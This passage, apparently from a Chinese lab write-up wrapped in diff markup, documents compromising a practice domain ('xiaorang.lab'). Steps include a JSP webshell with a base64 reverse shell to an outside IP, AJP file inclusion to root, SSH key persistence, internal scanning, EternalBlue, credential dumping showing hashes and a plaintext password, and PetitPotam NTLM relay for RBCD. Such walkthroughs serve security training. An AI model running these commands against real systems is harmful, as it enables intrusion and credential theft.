+</span></span><span class=line><span class=cl>    java.io.InputStream in = Runtime.getRuntime().exec(&#34;bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuMTI0LjIyMC8yMzMzIDA+JjE=}|{base64,-d}|{bash,-i}&#34;).getInputStream();
+</span></span><span class=line><span class=cl>    int a = -1;
+</span></span><span class=line><span class=cl>    byte[] b = new byte[2048];
+</span></span><span class=line><span class=cl>    out.print(&#34;&lt;pre&gt;&#34;);
+</span></span><span class=line><span class=cl>    while((a=in.read(b))!=-1){
+</span></span><span class=line><span class=cl>        out.println(new String(b));
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>    out.print(&#34;&lt;/pre&gt;&#34;);
+</span></span><span class=line><span class=cl>%&gt;
+</span></span></code></pre></td></tr></table></div></div><p>保存为1.txt上传就行</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python ajpShooter.py http://39.99.253.112:8080/ <span class=m>8009</span> /upload/b6d62648239c19f47dc7d1aecdaa4f84/20260823085910079.txt <span class=nb>eval</span>
+</span></span></code></pre></td></tr></table></div></div><p>直接弹到root的shell</p><p><img src=/p/spoofing/image-20260823210210304_hu_381beb414eb3afe5.webp width=553 height=270 srcset="/p/spoofing/image-20260823210210304_hu_a93ea51eef3d1bd1.webp 480w, /p/spoofing/image-20260823210210304_hu_381beb414eb3afe5.webp 553w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823210210304_hu_381beb414eb3afe5.webp data-full-width=553 data-full-height=270 loading=lazy decoding=async alt=image-20260823210210304 class=gallery-image data-flex-grow=204 data-flex-basis=491px></p><p>写个ssh公钥先</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1>#自己的机器上</span>
+</span></span><span class=line><span class=cl>ssh-keygen -t rsa -b <span class=m>4096</span>
+</span></span><span class=line><span class=cl>cat ~/.ssh/id_rsa.pub
+</span></span><span class=line><span class=cl><span class=c1>#弹的shell</span>
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;~/.ssh/id_rsa.pub的内容&#34;</span> &gt; /root/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>chmod <span class=m>600</span> /root/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ssh -i ~/.ssh/id_rsa root@靶机ip
+</span></span></code></pre></td></tr></table></div></div><p>传fscan扫内网</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>root@ubuntu:~# ./fscan32 -h 172.22.11.0/24
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>   ___                              _    
+</span></span><span class=line><span class=cl>  / _ <span class=se>\ </span>    ___  ___ _ __ __ _  ___<span class=p>|</span> <span class=p>|</span> __ 
+</span></span><span class=line><span class=cl> / /_<span class=se>\/</span>____/ __<span class=p>|</span>/ __<span class=p>|</span> <span class=err>&#39;</span>__/ _<span class=sb>`</span> <span class=p>|</span>/ __<span class=p>|</span> <span class=p>|</span>/ /
+</span></span><span class=line><span class=cl>/ /_<span class=se>\\</span>_____<span class=se>\_</span>_ <span class=se>\ </span><span class=o>(</span>__<span class=p>|</span> <span class=p>|</span> <span class=p>|</span> <span class=o>(</span>_<span class=p>|</span> <span class=p>|</span> <span class=o>(</span>__<span class=p>|</span>   &lt;    
+</span></span><span class=line><span class=cl><span class=se>\_</span>___/     <span class=p>|</span>___/<span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span>  <span class=se>\_</span>_,_<span class=p>|</span><span class=se>\_</span>__<span class=p>|</span>_<span class=p>|</span><span class=se>\_\ </span>  
+</span></span><span class=line><span class=cl>                     fscan version: 1.8.4
+</span></span><span class=line><span class=cl>start infoscan
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.11.6     is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.11.76    is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.11.45    is alive
+</span></span><span class=line><span class=cl><span class=o>(</span>icmp<span class=o>)</span> Target 172.22.11.26    is alive
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Icmp alive hosts len is: <span class=m>4</span>
+</span></span><span class=line><span class=cl>172.22.11.26:445 open
+</span></span><span class=line><span class=cl>172.22.11.45:445 open
+</span></span><span class=line><span class=cl>172.22.11.6:445 open
+</span></span><span class=line><span class=cl>172.22.11.26:139 open
+</span></span><span class=line><span class=cl>172.22.11.45:139 open
+</span></span><span class=line><span class=cl>172.22.11.26:135 open
+</span></span><span class=line><span class=cl>172.22.11.6:139 open
+</span></span><span class=line><span class=cl>172.22.11.45:135 open
+</span></span><span class=line><span class=cl>172.22.11.6:135 open
+</span></span><span class=line><span class=cl>172.22.11.76:22 open
+</span></span><span class=line><span class=cl>172.22.11.6:88 open
+</span></span><span class=line><span class=cl>172.22.11.76:8080 open
+</span></span><span class=line><span class=cl>172.22.11.76:8009 open
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> alive ports len is: <span class=m>13</span>
+</span></span><span class=line><span class=cl>start vulscan
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> MS17-010 172.22.11.45	<span class=o>(</span>Windows Server <span class=m>2008</span> R2 Enterprise <span class=m>7601</span> Service Pack 1<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.11.26    XIAORANG<span class=se>\X</span>R-LCM3AE8B          
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.11.6     <span class=o>[</span>+<span class=o>]</span> DC:XIAORANG<span class=se>\X</span>IAORANG-DC    
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.11.26
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>XR-LCM3AE8B
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.11.26
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetInfo 
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span>172.22.11.6
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>XIAORANG-DC
+</span></span><span class=line><span class=cl>   <span class=o>[</span>-&gt;<span class=o>]</span>172.22.11.6
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> WebTitle http://172.22.11.76:8080  code:200 len:7091   title:后台管理
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> NetBios 172.22.11.45    XR-DESKTOP.xiaorang.lab             Windows Server <span class=m>2008</span> R2 Enterprise <span class=m>7601</span> Service Pack <span class=m>1</span>
+</span></span><span class=line><span class=cl>已完成 13/13
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> 扫描结束,耗时: 8.638833764s
+</span></span></code></pre></td></tr></table></div></div><p>有个永恒之蓝，先做代理，做好之后直接打</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 msfconsole
+</span></span><span class=line><span class=cl>use exploit/windows/smb/ms17_010_eternalblue
+</span></span><span class=line><span class=cl><span class=nb>set</span> payload windows/x64/meterpreter/bind_tcp_uuid
+</span></span><span class=line><span class=cl><span class=nb>set</span> RHOSTS 172.22.11.45
+</span></span><span class=line><span class=cl>run
+</span></span></code></pre></td></tr></table></div></div><p>然后拿flag</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; cat C:/users/administrator/flag/flag02.txt
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl>                                                      <span class=c1>##                        </span>
+</span></span><span class=line><span class=cl>  :####:                                   :####      <span class=c1>##                        </span>
+</span></span><span class=line><span class=cl> :######                                   <span class=c1>#####      ##                        </span>
+</span></span><span class=line><span class=cl> <span class=c1>##:  :#                                   ##                                   </span>
+</span></span><span class=line><span class=cl> <span class=c1>##        ##.###:    .####.    .####.   #######    ####     ##.####    :###:## </span>
+</span></span><span class=line><span class=cl> <span class=c1>###:      #######:  .######.  .######.  #######    ####     #######   .####### </span>
+</span></span><span class=line><span class=cl> :#####:   <span class=c1>###  ###  ###  ###  ###  ###    ##         ##     ###  :##  ###  ### </span>
+</span></span><span class=line><span class=cl>  .#####:  <span class=c1>##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## </span>
+</span></span><span class=line><span class=cl>     :###  <span class=c1>##    ##  ##    ##  ##    ##    ##         ##     ##    ##  ##    ## </span>
+</span></span><span class=line><span class=cl>       <span class=c1>##  ##.  .##  ##.  .##  ##.  .##    ##         ##     ##    ##  ##.  .## </span>
+</span></span><span class=line><span class=cl> <span class=c1>#:.  :##  ###  ###  ###  ###  ###  ###    ##         ##     ##    ##  ###  ### </span>
+</span></span><span class=line><span class=cl> <span class=c1>#######:  #######:  .######.  .######.    ##      ########  ##    ##  .####### </span>
+</span></span><span class=line><span class=cl> .#####:   <span class=c1>##.###:    .####.    .####.     ##      ########  ##    ##   :###:## </span>
+</span></span><span class=line><span class=cl>           <span class=c1>##                                                           #.  :## </span>
+</span></span><span class=line><span class=cl>           <span class=c1>##                                                           ######  </span>
+</span></span><span class=line><span class=cl>           <span class=c1>##                                                           :####:  </span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>flag02: flag<span class=o>{</span>d11fb8c7-94a9-4b85-9805-390679250c49<span class=o>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>域内横向移动，先抓hash</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>load kiwi
+</span></span><span class=line><span class=cl>creds_all
+</span></span></code></pre></td></tr></table></div></div><p>导出域票据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>meterpreter &gt; creds_all
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>proxychains<span class=o>]</span> DLL init: proxychains-ng 4.17
+</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Running as SYSTEM
+</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Retrieving all credentials
+</span></span><span class=line><span class=cl>msv <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>===============</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username     Domain    NTLM                              SHA1
+</span></span><span class=line><span class=cl>--------     ------    ----                              ----
+</span></span><span class=line><span class=cl>XR-DESKTOP$  XIAORANG  996a5b076bf2f23b560f69e88ff1243b  e7cff979ce4f346594d298de2d6f96ad64d1bff6
+</span></span><span class=line><span class=cl>yangmei      XIAORANG  25e42ef4cc0ab6a8ff9e3edbbda91841  6b2838f81b57faed5d860adaf9401b0edb269a6f
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>wdigest <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>===================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username     Domain    Password
+</span></span><span class=line><span class=cl>--------     ------    --------
+</span></span><span class=line><span class=cl><span class=o>(</span>null<span class=o>)</span>       <span class=o>(</span>null<span class=o>)</span>    <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>XR-DESKTOP$  XIAORANG  <span class=m>52</span> f2 7e c8 3c b0 c8 ec 8f <span class=m>53</span> d6 <span class=m>33</span> 6a bf <span class=m>27</span> b5 e1 6d <span class=m>88</span> 3a f1 5a <span class=m>29</span> 0f 0b <span class=m>58</span> <span class=m>32</span> <span class=m>87</span> 6e <span class=m>12</span> d9 8c c3 e5 <span class=m>01</span> a2 ab 4f <span class=m>90</span> <span class=m>84</span> ec b0 <span class=m>91</span> e3 de <span class=m>35</span> 4b <span class=m>01</span> 3c da 0d <span class=m>72</span> a0 2b <span class=m>21</span> ff <span class=m>46</span> 9c <span class=m>15</span> 1e <span class=m>96</span> 6e
+</span></span><span class=line><span class=cl>                        3e <span class=m>68</span> db da dc <span class=m>74</span> b8 <span class=m>62</span> <span class=m>17</span> d1 8c f8 <span class=m>25</span> <span class=m>08</span> <span class=m>79</span> <span class=m>88</span> a1 <span class=m>40</span> <span class=m>64</span> <span class=m>81</span> 3d <span class=m>19</span> <span class=m>48</span> <span class=m>31</span> <span class=m>24</span> d8 3b 5a d8 <span class=m>64</span> <span class=m>48</span> 4c f8 b6 d2 8e <span class=m>79</span> d7 e8 <span class=m>71</span> e7 e9 ec 4a 4c 8e a7 eb b1 ae <span class=m>60</span> <span class=m>42</span> <span class=m>69</span> 5b 5b <span class=m>82</span> 4d cf <span class=m>44</span> ff <span class=m>39</span> d
+</span></span><span class=line><span class=cl>                       a <span class=m>26</span> 8a <span class=m>06</span> ca <span class=m>84</span> da ba <span class=m>95</span> b6 dc <span class=m>81</span> <span class=m>87</span> <span class=m>98</span> 8d <span class=m>29</span> 7c b1 <span class=m>57</span> 8c <span class=m>04</span> 6b 8e <span class=m>99</span> 4b a9 6e <span class=m>19</span> 7b <span class=m>61</span> f6 da <span class=m>70</span> df e6 ce f5 d3 <span class=m>64</span> d3 df d3 cb 0f <span class=m>60</span> <span class=m>27</span> <span class=m>09</span> b5 5e <span class=m>03</span> <span class=m>03</span> <span class=m>50</span> <span class=m>00</span> c6 fe <span class=m>93</span> <span class=m>67</span> a5 <span class=m>74</span> <span class=m>70</span> <span class=m>23</span> a5
+</span></span><span class=line><span class=cl>                       <span class=m>91</span> <span class=m>04</span> <span class=m>81</span> ed ba 8a 0a 4c e1 <span class=m>15</span> f2 db <span class=m>19</span> <span class=m>14</span> b3 2d <span class=m>00</span> <span class=m>86</span> 3f <span class=m>50</span> 7c <span class=nb>cd</span> ae <span class=m>42</span> <span class=m>96</span> <span class=m>66</span> <span class=m>34</span> 7b 4a a5 fb <span class=m>18</span> 5e <span class=m>33</span> <span class=m>38</span> <span class=m>14</span> <span class=m>35</span> 7d 4e 2c 3a c9 <span class=m>42</span> <span class=m>89</span> <span class=m>97</span> f3 <span class=m>84</span> f5 <span class=m>73</span> b0 <span class=m>30</span> <span class=m>98</span> <span class=m>58</span> 3d <span class=m>94</span>
+</span></span><span class=line><span class=cl>yangmei      XIAORANG  xrihGHgoNZQ
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>kerberos <span class=nv>credentials</span>
+</span></span><span class=line><span class=cl><span class=o>====================</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Username     Domain        Password
+</span></span><span class=line><span class=cl>--------     ------        --------
+</span></span><span class=line><span class=cl><span class=o>(</span>null<span class=o>)</span>       <span class=o>(</span>null<span class=o>)</span>        <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>xr-desktop$  XIAORANG.LAB  <span class=m>52</span> f2 7e c8 3c b0 c8 ec 8f <span class=m>53</span> d6 <span class=m>33</span> 6a bf <span class=m>27</span> b5 e1 6d <span class=m>88</span> 3a f1 5a <span class=m>29</span> 0f 0b <span class=m>58</span> <span class=m>32</span> <span class=m>87</span> 6e <span class=m>12</span> d9 8c c3 e5 <span class=m>01</span> a2 ab 4f <span class=m>90</span> <span class=m>84</span> ec b0 <span class=m>91</span> e3 de <span class=m>35</span> 4b <span class=m>01</span> 3c da 0d <span class=m>72</span> a0 2b <span class=m>21</span> ff <span class=m>46</span> 9c <span class=m>15</span> 1e <span class=m>9</span>
+</span></span><span class=line><span class=cl>                           <span class=m>6</span> 6e 3e <span class=m>68</span> db da dc <span class=m>74</span> b8 <span class=m>62</span> <span class=m>17</span> d1 8c f8 <span class=m>25</span> <span class=m>08</span> <span class=m>79</span> <span class=m>88</span> a1 <span class=m>40</span> <span class=m>64</span> <span class=m>81</span> 3d <span class=m>19</span> <span class=m>48</span> <span class=m>31</span> <span class=m>24</span> d8 3b 5a d8 <span class=m>64</span> <span class=m>48</span> 4c f8 b6 d2 8e <span class=m>79</span> d7 e8 <span class=m>71</span> e7 e9 ec 4a 4c 8e a7 eb b1 ae <span class=m>60</span> <span class=m>42</span> <span class=m>69</span> 5b 5b <span class=m>82</span> 4d cf <span class=m>44</span>
+</span></span><span class=line><span class=cl>                            ff <span class=m>39</span> da <span class=m>26</span> 8a <span class=m>06</span> ca <span class=m>84</span> da ba <span class=m>95</span> b6 dc <span class=m>81</span> <span class=m>87</span> <span class=m>98</span> 8d <span class=m>29</span> 7c b1 <span class=m>57</span> 8c <span class=m>04</span> 6b 8e <span class=m>99</span> 4b a9 6e <span class=m>19</span> 7b <span class=m>61</span> f6 da <span class=m>70</span> df e6 ce f5 d3 <span class=m>64</span> d3 df d3 cb 0f <span class=m>60</span> <span class=m>27</span> <span class=m>09</span> b5 5e <span class=m>03</span> <span class=m>03</span> <span class=m>50</span> <span class=m>00</span> c6 fe <span class=m>93</span> <span class=m>67</span> a5
+</span></span><span class=line><span class=cl>                           <span class=m>74</span> <span class=m>70</span> <span class=m>23</span> a5 <span class=m>91</span> <span class=m>04</span> <span class=m>81</span> ed ba 8a 0a 4c e1 <span class=m>15</span> f2 db <span class=m>19</span> <span class=m>14</span> b3 2d <span class=m>00</span> <span class=m>86</span> 3f <span class=m>50</span> 7c <span class=nb>cd</span> ae <span class=m>42</span> <span class=m>96</span> <span class=m>66</span> <span class=m>34</span> 7b 4a a5 fb <span class=m>18</span> 5e <span class=m>33</span> <span class=m>38</span> <span class=m>14</span> <span class=m>35</span> 7d 4e 2c 3a c9 <span class=m>42</span> <span class=m>89</span> <span class=m>97</span> f3 <span class=m>84</span> f5 <span class=m>73</span> b0 <span class=m>30</span> <span class=m>98</span> <span class=m>58</span> 3d <span class=m>94</span>
+</span></span><span class=line><span class=cl>xr-desktop$  XIAORANG.LAB  <span class=o>(</span>null<span class=o>)</span>
+</span></span><span class=line><span class=cl>yangmei      XIAORANG.LAB  xrihGHgoNZQ
+</span></span></code></pre></td></tr></table></div></div><p>可以发现yangmei这个用户是有明文密码的,cme扫一下WebClient和petitpotam</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 -q crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M webdav
+</span></span><span class=line><span class=cl>proxychains4 -q crackmapexec smb 172.22.11.0/24 -u yangmei -p xrihGHgoNZQ -M petitpotam
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823213704870_hu_18e26c7cc55a0dd1.webp width=1024 height=80 srcset="/p/spoofing/image-20260823213704870_hu_fd35a4568fd1d108.webp 480w, /p/spoofing/image-20260823213704870_hu_18e26c7cc55a0dd1.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823213704870_hu_632288f1452fe280.webp data-full-width=1487 data-full-height=116 loading=lazy decoding=async alt=image-20260823213704870 class=gallery-image data-flex-grow=1281 data-flex-basis=3076px></p><p>这里crackmapexec貌似还有点问题换可执行文件那种的了<a class=link href=https://github.com/byt3bl33d3r/CrackMapExec/releases/tag/v5.4.0 target=_blank rel=noopener>Release 5.4.0 - Indestructible G0thm0g · byt3bl33d3r/CrackMapExec · GitHub</a>，是python版本的问题</p><p><img src=/p/spoofing/image-20260823215541225_hu_3799fe48f1b9ac1e.webp width=982 height=196 srcset="/p/spoofing/image-20260823215541225_hu_74513e73888eb180.webp 480w, /p/spoofing/image-20260823215541225_hu_3799fe48f1b9ac1e.webp 982w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823215541225_hu_3799fe48f1b9ac1e.webp data-full-width=982 data-full-height=196 loading=lazy decoding=async alt=image-20260823215541225 class=gallery-image data-flex-grow=501 data-flex-basis=1202px></p><p>所以打26这台机子就行，然后这里使用无ADCS + Petitpotam + ntlm中继打法，思路是用petitpotam触发存在漏洞且开启了webclient服务的目标，利用petitpotam触发目标访问我们的http中继服务，目标将会使用webclient携带ntlm认证访问我们的中继，并且将其认证中继到ldap，获取到机器账户的身份，以机器账户的身份修改其自身的msDS-AllowedToActOnBehalfOfOtherIdentity属性，配置到XR-LCM3AE8B.xiaorang.lab的RBCD。</p><p>但这里有个条件，需要我们把服务器端口的流量转发到客户端本地的80，但SSH的反向端口转发监听的时候只会监听127.0.0.1，这里我们让流量 0.0.0.0:80 转发到 127.0.0.1:79，再反向转发回客户端本地的80 ,变相使80监听在0.0.0.0</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>攻击机
+</span></span><span class=line><span class=cl>ssh-keygen -t rsa -b <span class=m>4096</span> 
+</span></span><span class=line><span class=cl>cat /root/.ssh/id_rsa.pub
+</span></span><span class=line><span class=cl>靶机
+</span></span><span class=line><span class=cl><span class=nb>echo</span> <span class=s2>&#34;xxx&#34;</span> &gt;/root/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>chmod <span class=m>600</span> /root/.ssh/authorized_keys
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>ssh -i ~/.ssh/id_rsa root@39.99.253.112  -D SOCKS代理IP:PORT -R <span class=se>\*</span>:79:127.0.0.1:80
+</span></span><span class=line><span class=cl>nohup socat TCP-LISTEN:80,fork,bind<span class=o>=</span>0.0.0.0 TCP:localhost:79 <span class=p>&amp;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823220905019_hu_6bdacc12ce70e549.webp width=796 height=393 srcset="/p/spoofing/image-20260823220905019_hu_304a69ab86148313.webp 480w, /p/spoofing/image-20260823220905019_hu_6bdacc12ce70e549.webp 796w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823220905019_hu_6bdacc12ce70e549.webp data-full-width=796 data-full-height=393 loading=lazy decoding=async alt=image-20260823220905019 class=gallery-image data-flex-grow=202 data-flex-basis=486px></p><p>这里流量已经成功转发到我们的kali,本地开启ntlmrelayx监听，利用前面拿下的XR-Desktop作为恶意机器账户设置RBCD,再用<a class=link href=https://github.com/topotam/PetitPotam target=_blank rel=noopener>PetitPotam</a>强制目标用webclient访问我们的监听</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>proxychains4 python3 ntlmrelayx.py -t ldap://172.22.11.6 --no-dump --no-da --no-acl --escalate-user <span class=s1>&#39;xr-desktop$&#39;</span> --delegate-access
+</span></span><span class=line><span class=cl>proxychains4 python3 PetitPotam.py -u yangmei -p <span class=s1>&#39;xrihGHgoNZQ&#39;</span> -d xiaorang.lab ubuntu@80/pwn.txt 172.22.11.26
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/spoofing/image-20260823222026042_hu_c8af1613d6a5532f.webp width=982 height=522 srcset="/p/spoofing/image-20260823222026042_hu_d6ebe23640549a4.webp 480w, /p/spoofing/image-20260823222026042_hu_c8af1613d6a5532f.webp 982w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823222026042_hu_c8af1613d6a5532f.webp data-full-width=982 data-full-height=522 loading=lazy decoding=async alt=image-20260823222026042 class=gallery-image data-flex-grow=188 data-flex-basis=451px></p><p><img src=/p/spoofing/image-20260823230553975_hu_2db9c726f5159c8c.webp width=1024 height=461 srcset="/p/spoofing/image-20260823230553975_hu_41ae26d1a97bf0ad.webp 480w, /p/spoofing/image-20260823230553975_hu_2db9c726f5159c8c.webp 1024w" sizes="(min-width: 1280px) 800px, (min-width: 768px) 65vw, calc(100vw - 30px)" data-full-src=/p/spoofing/image-20260823230553975_hu_583a7a83d33a6a0d.webp data-full-width=1161 data-full-height=523 loading=lazy decoding=async alt=image-20260823230553975 class=gallery-image data-flex-grow=221 data-flex-basis=532px></p><p>配好之后用之前172.22.11.45上抓的机器账户XR-DESKTOP$哈希打172.22.11.26的RBCD，申请ST票据</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
